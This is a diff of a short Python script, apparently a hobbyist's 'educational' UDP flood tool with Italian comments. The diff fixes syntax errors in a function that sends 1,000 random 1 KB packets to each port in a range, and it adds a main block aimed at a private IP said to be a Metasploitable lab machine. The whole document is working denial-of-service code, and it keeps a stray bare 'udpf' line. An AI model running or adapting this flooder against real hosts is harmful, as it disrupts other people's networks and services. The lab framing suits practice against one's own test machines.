@@ -1,7 +1,10 @@
+# Author: lorenzo-bfn
+# For educational purposes 
+
 import os, sys, random, socket, datetime, traceback
 from typing import Union, List, Tuple
 
-def udpf( target_ip:str = None, port_range : Union[ List[int,int],Tuple[int,int]] = [0, 9999], pkt_count:int = 1000, timeout_secs = 20 ):
+def udpf( target_ip:str = None, port_range : Union[ List[int], Tuple[int, int] ] = [0, 9999], pkt_count:int = 1000, timeout_secs = 20 ):
     """udpf
 
     Args:
@@ -12,8 +15,10 @@ def udpf( target_ip:str = None, port_range : Union[ List[int,int],Tuple[int,int]
     """
     if target_ip and port_range:
         if isinstance( port_range, list ): port_range.sort()
-        elif isinstance( port_range, tuple ): if port_range[0] >= port_range[1] = port_range = ( port_range[1], port_range[0] ) 
-        
+        elif isinstance( port_range, tuple ): 
+            if port_range[0] >= port_range[1]:
+                port_range = ( port_range[1], port_range[0] ) 
+        udpf
         print("INFO || Beginning udpf function over ports %d->%d of target %s" % ( port_range[0], port_range[1], target_ip ) )
         data = os.urandom(1024) # Qui è generato un blocco dati di 1000 bytes o 1.033kb con la funzione os.urandom
         now = datetime.datetime.now()
@@ -22,15 +27,17 @@ def udpf( target_ip:str = None, port_range : Union[ List[int,int],Tuple[int,int]
             try:
                 # Essendo la funzione operativa per i pacchetti "User Datagram Protocol", si imposta l'utilizzo del protocollo basato su diagrammi "SOCK_DGRAM" 
                 s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
-                addr = (str(ip), int(port))
-                for _ in range(times):
+                addr = (str(target_ip), int(target_port))
+                for _ in range(pkt_count):
                     s.sendto(data, addr)
-                print("INFO || Sent packet of size %s Kb to port %s process %s"  % ( sys.getsizeof( data ) * 0.001, str(port), str(os.getpid() ) ) )
-                if (datetime.datetime.now() - now).total_seconds() > timeout:
-                    break
+                    print("INFO || Sent packet of size %s Kb to port %s process %s"  % ( sys.getsizeof( data ) * 0.001, str(target_port), str(os.getpid() ) ) )
+                    if (datetime.datetime.now() - now).total_seconds() > timeout_secs:
+                        break
             except Exception as err:
-                print(" ERROR || An %s Exception occurred:\n%s\n" % ( err.__class__.__name__ , ) )
-        
+                print(" ERROR || An %s Exception occurred:\n%s\n" % ( err.__class__.__name__ , traceback.format_exc() ) )
         print("INFO || Function over ports %d->%d of target %s ended" % ( port_range[0], port_range[1], target_ip ) )
     else:
         print("WARN || Either variable target_ip or port_range are null or undefined. Unable to proceed." )
+        
+if __name__ == '__main__':
+    udpf( target_ip = '192.168.2.50', port_range = [20, 50] ) # Points to metasploitable virtual machine
